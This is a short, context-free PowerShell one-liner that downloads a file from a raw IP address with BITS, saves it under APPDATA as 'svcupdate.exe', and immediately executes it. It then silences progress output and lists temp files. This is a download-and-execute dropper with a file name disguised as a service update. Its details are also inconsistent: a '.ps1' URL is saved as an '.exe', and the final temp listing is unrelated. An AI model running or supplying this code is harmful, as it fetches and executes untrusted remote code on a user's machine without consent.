
$PayloadUrl = 'https://198.51.100.19/updater.ps1'; $WorkingPath = "$env:APPDATA\svcupdate.exe"; Start-BitsTransfer -Source $PayloadUrl -Destination $WorkingPath; Start-Process -FilePath $WorkingPath; $ProgressPreference = "SilentlyContinue"; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
